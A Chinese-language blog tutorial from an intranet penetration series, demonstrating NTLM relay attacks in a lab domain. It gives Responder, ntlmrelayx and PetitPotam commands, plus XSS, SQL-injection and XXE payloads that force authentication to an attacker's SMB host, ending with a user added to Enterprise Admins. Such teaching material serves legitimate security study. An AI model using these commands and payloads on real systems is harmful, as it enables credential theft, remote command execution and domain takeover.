> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&mid=2247485702&idx=1&sn=1f4dd354863e6204f109e0a90ab57055

#  【内网渗透基础】四、内网横向-NTLM中继攻击  
原创 混子Hacker  混子Hacker   2025-06-15 07:58  
  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td data-colwidth="576" width="576" valign="top" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(255, 255, 255);letter-spacing: 0.578px;text-align: center;border-top-color: rgb(255, 255, 255);visibility: visible;"><strong style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;letter-spacing: 0.578px;font-family: inherit;font-size: 1em;text-decoration: inherit;visibility: visible;"><span style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgb(217, 33, 66);visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">免责声明</span></span></strong></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不承担任何法律及连带责任。</span></section></td></tr></tbody></table>  
  
  
[   
简介   
]  
  
——  
——  
——  
——  
——  
——  
——  
——  
——  
——  
——  
  
   
天上尘，地下土。你选择什么样的方式，就会拥有什么样的人生。真正的优秀不是别人逼出来的，而是自己和自己死磕  
   
  
【  
摘自  
《  
真正的优秀，都是自找的  
》  
】   
  
——  
——  
——  
——  
——  
——  
——  
——  
——  
——  
——  
  
NTLM中继  
  
本文主要讲解内网横向中  
NTLM  
中继的利用。  
NTLM  
是"  
NTLAN Manager  
"的缩写，是一种基于挑战应答的网络认证方式，在设计之初并没有规定NTLM的传输协议是什么，在实际的认证中  
SMB  
、  
LDAP  
、  
HTTP  
、  
MSSQL  
都可以作为其传输协议。这里需要介绍下  
NTLM Hash  
和  
Net -NTLM Hash  
的区别  
  
NTLM Hash  
是  
存储在本地计算机的安全账户管理器 (  
SAM  
) 数据库或域控制器的   
NTDS.dit   
文件中的  
用户密码Hash值  
；  
  
Net-NTLM Hash  
是  
由  
NTLM  
认证过程中客户端本地用户密码的  
Hash  
对服务端返回的  
challenge  
加密后返回给服务器用于验证的  
Response  
，这类  
Hash  
一般用于碰撞，在   
Relay Attack  
攻击使用的正是这类Hash  
  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;visibility: visible;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">目录</span></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: left;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">NTLM中继</span></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: left;visibility: visible;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;visibility: visible;">    <span textstyle="" style="font-size: 15px;">一、NTLM中继原理</span></span></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: left;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;">    <span textstyle="" style="font-size: 15px;">二、中继攻击</span></span><span leaf="" data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br/></span></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: left;"><span leaf="" data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span textstyle="" style="font-size: 15px;">               </span><span textstyle="" style="font-size: 14px;"> 2.1</span><span textstyle="" style="font-size: 15px;"> </span><span textstyle="" style="font-size: 14px;">SMB中继</span></span></section><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;text-align: left;"><span leaf="" data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span textstyle="" style="font-size: 15px;">                </span><span textstyle="" style="font-size: 14px;">2.2 </span></span><span data-pm-slice="0 0 []" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;letter-spacing: 0.578px;line-height: 1.4;text-align: left;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span textstyle="" style="font-size: 14px;">ldap中继</span></span></span></section></td></tr></tbody></table>  
  
  
漏洞信息  
  
  
**混子Hacker**  
  
**01**  
  
NTLM中继原理  
  
> 在NTLM认证过程中没有对双方身份进行认证，也就是可以存在一个中间人在客户端和服务器直接进行转发Relay（重放），从而客户端的Net-NTLM Hash并将其进行Relay（重放）到服务器从而完成认证。  
  
  
NTLM认证流程  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskiaOZiarL3pCASLZAzA9IgXiaTee4HCbfKeibibD7r8AZsXzEicLVwpRJicTKg/640?wx_fmt=png&from=appmsg "")  
  
Step 1：客户端向服务器发送  
用户名登录请求  
  
Step 2：Type2 message(challenge):服务器接受请求之后查看SAM数据库是否存在用户Hash，存在的话生成一个challenge发送给客户端，并将challenge与Hash一起加密存储在本地  
  
Step 3：Type3 message(authentication):客户端收到challenge之后将自己的密码Hash与challenge一起进行加密之后发送给服务器，服务器收到加密的数据之后与本地存储的加密信息进行对比是否相同  
  
  
**混子Hacker**********  
  
**02**  
  
中继攻击  
  
  
  
2.1 SMB中继  
  
环境：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGsKy5UCRv1iawSrfQn0IPbKIKhp5UkAYBw2Yruib4ic6ibia3ZT4oKJMeV0Mr4icXLFzFTOCcZNdWmt6guQ/640?wx_fmt=png&from=appmsg "")  
  
前置条件：中继的服务器需要关闭SMB签名  
  
查看是否开启签名  
  
可以使用nmap查看SMB签名是否关闭  

```
nmap -n -p445 ip --script=smb-security-mod
```

  
如下表示required开启了签名，显示disabled表示关闭  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxsk9XQZ1Nib6qtKZlArI9vGLNo5qUUD8ics8ZQjehyCbT7qGRpJBhKIpBiaQ/640?wx_fmt=png&from=appmsg "")  
  
或抓包查看signing enabled字段  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskWUGJiaTUWpzhCWut6R5D2vsGOHd5rojZyFAZ94XbvblfAh2mxhvZvfw/640?wx_fmt=png&from=appmsg "")  
  
关闭SMB签名  
  
PS：自己测试的过程中可通过注册表  

```
路径：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters。


RequireSecuritySignature → 值设为0（禁用签名要求）
EnableSecuritySignature → 值设为0（禁用签名）


执行后需‌重启SMB服务‌生效：
Restart-Service LanmanServer -Force
Restart-Service LanmanWorkstation -Force
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskSGmkzQImPNbPzzicCjOdD1YduMGFn5d1mZvs3mm0RXRXblNyEv9icT2g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskichrm8oictwKjGq0RYOmib13LuvpbGOBH1Fv1qgqr679vNZicqt6NDiaeGw/640?wx_fmt=png&from=appmsg "")  
  
**运行Responder**  
  
**设置smb和http为Off**  
  
**编辑Responder.conf文件，设置smb和http为Off**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskKzkeCd6vU4uqGFusC1eF8Mia3H3kibP3cTL6Ql6eMcg4ibUIPqu8PeNWg/640?wx_fmt=png&from=appmsg "")  
  
获取凭据  
  
**kali上运行Responder开启监听**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxsktbGCic6ia3lxftJGwgicjoqs8S1VicHeue2XicmAG2DHBLhJORnyH4EPhbQ/640?wx_fmt=png&from=appmsg "")  
  
重放凭据  
  
利用ntlmrelayx.py重放凭据并执行命令  

```
ntlmrelayx.py -t 受害者ip -c whoami -smb2support
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskYf1liaWrL74OKPEGhubCgDvsACxfMrn3v8HyHibqHNDhic4KjOq7icOX6w/640?wx_fmt=png&from=appmsg "")  
  
  
触发凭据  
  
方法：  
  
1、访问不存在的SMB共享地址（类似ARP欺骗）：此时会广播询问，攻击机会响应说自己就是这个地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGsKy5UCRv1iawSrfQn0IPbKIwgiblU1tZgwV2B0fXehzQJskiapQ20ZeBGqtPQ0ZEjS3p5pPxlnsrgHg/640?wx_fmt=png&from=appmsg "")  
  
2、系统图标：在文件夹属性中修改图标地址为攻击机地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGsKy5UCRv1iawSrfQn0IPbKIiaHT93wiaBSEzLOEMwgMVlWfpMHfiaFlbpeicZtick2h012stUJdPuhxElw/640?wx_fmt=png&from=appmsg "")  
  
  
3、scf文件：scf文件包含了IconFile属性，资源管理器会尝试通过scf文件获取文件的图标  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGsKy5UCRv1iawSrfQn0IPbKIRYHcCPT9c33hr6jAyNDLN5Fs8Mibp0ErDRjPiaVib7U3PQS6WKXPMsDDA/640?wx_fmt=png&from=appmsg "")  
  
4、构造PDF：PDF规范允许为GoTobe和GoToR条目加载远程内容，PDF文件可以添加一项功能，请求远程SMB服务器的文件。使用脚本https://github.com/3gstudent/Worse-PDF，修改  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGsKy5UCRv1iawSrfQn0IPbKIxwr8ep70Viawkg0jbTWOhj5DvFdYI8zVp5eSWkjSZamYyfnkU5m2QAA/640?wx_fmt=png&from=appmsg "")  
  
5、还可以使用web漏洞如xss、xxe、sql注入、文件包含等等  

```
xss：<imgsrc=&#34;\\\\ip\\hunzihacker&#34;onerror=alert(1)>


sql注入：select 1,(load_file('\\\\ip\\hunzihacker')),3


xxe：<?xmlversion=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?>
<!DOCTYPE root [<!ENTITY hunzihacker SYSTEM &#34;php://filter/convert.base64-encode/resource=//ip/hunzihacker&#34; >
]>
<root>
<name></name>
<tel></tel>
<email>&hunzihacker;</email>
<password></password>
</root>
```

  
这里使用第一种方法  
  
在serv 2008（192.168.232.133）上访问不存在的路径  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskRWfNSEQHDwbkrsjxOTCCRMJrGyZxqRJRYyibYEQNT4fesdETOv9TTfw/640?wx_fmt=png&from=appmsg "")  
  
成功在域内主机（192.168.232.132）上执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGubeTkuN1ZJ3eWibT9kqDxskTLibBcd7ibaNC2A2q7ticrydVdCW9HQbRzXedScYsJ8Oo7e5iaxexQly3A/640?wx_fmt=png&from=appmsg "")  
  
  
  
2.2 LDAP中继  
> 需要关闭  
ldap签名。  
默认情况下，ldap服务器就在域控里面，而且默认策略就是协商签名。而不是强制签名，  
客户端分情况，如果是smb协议的话，默认要求签名的，如果是webadv或者http协议，是不要求签名的。  
  
  
然而客户端发起使用SMB协议默认是要求签名的  
  
如果直接修改标志位会导致  
MIC（消息完整性检查）  
  
此时需要结合CVE-2019-1040进行绕过，将SMB Relay到LDAP  
  
  
启动ntlmrelayx，指定LDAP为攻击目标（-t ldap://域控IP）  

```
ntlmrelayx.py -t ldap://192.168.1.10 --remove-mic
# 参数解释：
# -t ldap://192.168.1.10     : 中继目标为域控的LDAP服务
# --remove-mic               : 移除MIC标志（绕过某些签名检查）
```

  
成功将user4用户添加到企业管理组里面了，这里是通过SMB协议进行触发的，中继到了Ldap协议。这里中继的是ldap，ldaps也是可以的，这里的ip是210，因为只有域控有Ldap服务。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGvP4Bcp93v0h4KEKEZ2RtOmamiaFsY0DcqnwhgHO9ZNUok5dnU9BiaqElgXgb89kyibzDLHwic77OaYTg/640?wx_fmt=png&from=appmsg "")  
  
  

```
python3 PetitPotam.py -d god.org -u hunzihacker -p Admin@123 kali-ip AD-ip
```

  
如下图可以看到user4已经是企业管理组的成员了。  
  
![在这里插入图片描述](https://mmbiz.qpic.cn/mmbiz_png/a5FBLichkAGvP4Bcp93v0h4KEKEZ2RtOmO0Pib3CCdAaNnTA3RacUpOwZQtN0fGTtjhIXKDic1CxicNGrCialkPhqiag/640?wx_fmt=png&from=appmsg "")  
  
  
  
<table><tbody><tr style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><td data-colwidth="576" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 5px 10px;outline: 0px;overflow-wrap: break-word !important;word-break: break-all;hyphens: auto;border: 1px solid rgb(221, 221, 221);max-width: 100%;box-sizing: border-box !important;"><section style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span textstyle="" style="font-weight: bold;">本专栏往期文章：</span></span></section><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485021&amp;idx=1&amp;sn=99299a009d9a1c4f29fc0960e0badbf4&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】一、信息收集" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】一、信息收集</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485051&amp;idx=1&amp;sn=e9e7e4e31df85cbffb19311d3cec341b&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】二、隧道建立" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】二、隧道建立</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485075&amp;idx=1&amp;sn=3120064704c678baa9b8c8b91433dea0&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】二、隧道建立（下）" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】二、隧道建立（下）</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485099&amp;idx=1&amp;sn=1cbc60033e11a73de30f87be207cfcb5&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】三、权限提升-Windows内核提权" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】三、权限提升-Windows内核提权</a></span><span leaf="" data-pm-slice="1 1 [&#34;para&#34;,{&#34;tagName&#34;:&#34;p&#34;,&#34;attributes&#34;:{&#34;style&#34;:&#34;-webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; outline: 0px; max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important; clear: both; min-height: 1em; color: rgba(0, 0, 0, 0.9); font-family: \&#34;PingFang SC\&#34;, system-ui, -apple-system, BlinkMacSystemFont, \&#34;Helvetica Neue\&#34;, \&#34;Hiragino Sans GB\&#34;, \&#34;Microsoft YaHei UI\&#34;, \&#34;Microsoft YaHei\&#34;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;&#34;},&#34;namespaceURI&#34;:&#34;http://www.w3.org/1999/xhtml&#34;}]" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br/></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" data-pm-slice="1 1 [&#34;para&#34;,{&#34;tagName&#34;:&#34;p&#34;,&#34;attributes&#34;:{&#34;style&#34;:&#34;-webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; outline: 0px; max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important; clear: both; min-height: 1em; color: rgba(0, 0, 0, 0.9); font-family: \&#34;PingFang SC\&#34;, system-ui, -apple-system, BlinkMacSystemFont, \&#34;Helvetica Neue\&#34;, \&#34;Hiragino Sans GB\&#34;, \&#34;Microsoft YaHei UI\&#34;, \&#34;Microsoft YaHei\&#34;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;&#34;},&#34;namespaceURI&#34;:&#34;http://www.w3.org/1999/xhtml&#34;}]" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485137&amp;idx=1&amp;sn=3c8aaba4cc2083e888597a6c77304968&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】三、权限提升-Windows内核提权（下）" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】三、权限提升-Windows内核提权（下）</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" data-pm-slice="1 1 [&#34;para&#34;,{&#34;tagName&#34;:&#34;p&#34;,&#34;attributes&#34;:{&#34;style&#34;:&#34;-webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; outline: 0px; max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important; clear: both; min-height: 1em; color: rgba(0, 0, 0, 0.9); font-family: \&#34;PingFang SC\&#34;, system-ui, -apple-system, BlinkMacSystemFont, \&#34;Helvetica Neue\&#34;, \&#34;Hiragino Sans GB\&#34;, \&#34;Microsoft YaHei UI\&#34;, \&#34;Microsoft YaHei\&#34;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;&#34;},&#34;namespaceURI&#34;:&#34;http://www.w3.org/1999/xhtml&#34;}]" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485165&amp;idx=1&amp;sn=3e85c884fce3daf22cbdb9f182932efd&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】三、权限提升-Windows第三方软件提权" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】三、权限提升-Windows第三方软件提权</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span leaf="" data-pm-slice="1 1 [&#34;para&#34;,{&#34;tagName&#34;:&#34;p&#34;,&#34;attributes&#34;:{&#34;style&#34;:&#34;-webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; outline: 0px; max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important; clear: both; min-height: 1em; color: rgba(0, 0, 0, 0.9); font-family: \&#34;PingFang SC\&#34;, system-ui, -apple-system, BlinkMacSystemFont, \&#34;Helvetica Neue\&#34;, \&#34;Hiragino Sans GB\&#34;, \&#34;Microsoft YaHei UI\&#34;, \&#34;Microsoft YaHei\&#34;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;&#34;},&#34;namespaceURI&#34;:&#34;http://www.w3.org/1999/xhtml&#34;}]" style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485198&amp;idx=1&amp;sn=c08519783e0d74c91f8512b5bccc1b10&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】三、权限提升-Linux提权" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】三、权限提升-Linux提权</a></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span leaf=""><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485226&amp;idx=1&amp;sn=7c20678854fc4b374b15fd82b5c6430a&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】四、内网横向-主机凭据获取" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】四、内网横向-主机凭据获取</a></span></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span leaf=""><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485285&amp;idx=1&amp;sn=6acbf7d6818c14413ab132b6a252f0ff&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】四、内网横向-IPC横向" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】四、内网横向-IPC横向</a></span></span></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span leaf=""><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485329&amp;idx=1&amp;sn=149debb1a097bb008f4e8a0e375f9e99&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】四、内网横向-凭证传递攻击" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】四、内网横向-凭证传递攻击</a></span></span></span></span></p><p style="-webkit-tap-highlight-color: transparent;margin: 0px;padding: 0px;outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;clear: both;min-height: 1em;letter-spacing: 0.544px;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span style="margin: 0px 3px 0px 0px;padding: 0px;overflow: hidden;text-overflow: ellipsis;"><span leaf=""><a class="normal_text_link" target="_blank" style="" href="https://mp.weixin.qq.com/s?__biz=MzUxMTk4OTA1NQ==&amp;mid=2247485665&amp;idx=1&amp;sn=ab492b9b4c341fcf6d0321e0e3949737&amp;scene=21#wechat_redirect" textvalue="【内网渗透基础】四、内网横向-委派攻击" data-itemshowtype="0" linktype="text" data-linktype="2">【内网渗透基础】四、内网横向-委派攻击</a></span></span></span></span></p></td></tr></tbody></table>  
  
<<<    
END   
>>>  
  
  
